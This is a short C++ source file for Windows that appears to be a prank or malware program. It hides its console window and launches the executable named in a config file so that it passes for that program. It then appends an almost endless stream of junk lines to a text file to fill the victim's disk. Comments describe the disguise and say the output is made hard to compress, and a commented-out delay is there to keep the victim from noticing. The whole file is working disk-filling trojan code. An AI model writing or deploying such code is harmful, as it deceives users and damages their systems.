#include <fstream>
#include <iostream>
#include <windows.h>
using namespace std;
int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    const string configfile = "configfile.txt";
    const string textBombName = "lolcat.txt";
    string exeToOpen; //The exe we are pretending to be
    
    ifstream configs;
    ofstream lolCatBomb;
    configs.open(configfile);
    if (configs.is_open())
    {
       getline(configs, exeToOpen);
       const char* exeToOpenCStr = exeToOpen.data(); //system() needs a cstring apparently
       system(exeToOpenCStr);

       lolCatBomb.open(textBombName, ios::app);
       if (lolCatBomb.is_open())
       {
        for (unsigned long long i=0;i<999999999999999999;i++) //Sometimes windows will compress heavy folders, so this makes it hard af to compress well
        {
        lolCatBomb << i * 2 << i << "Youre mother" << i + 1 << i + 7 << "\n";
        //Sleep(1); //We use sleep so it doesn't cause such a preformance impact they notice it (Remember, the turtle won the race)
        }
        lolCatBomb.close();
       }
        

    configs.close();
    }
    else
    {
        cout << "Debug\n";
        return 0;
    }
    return 0;
}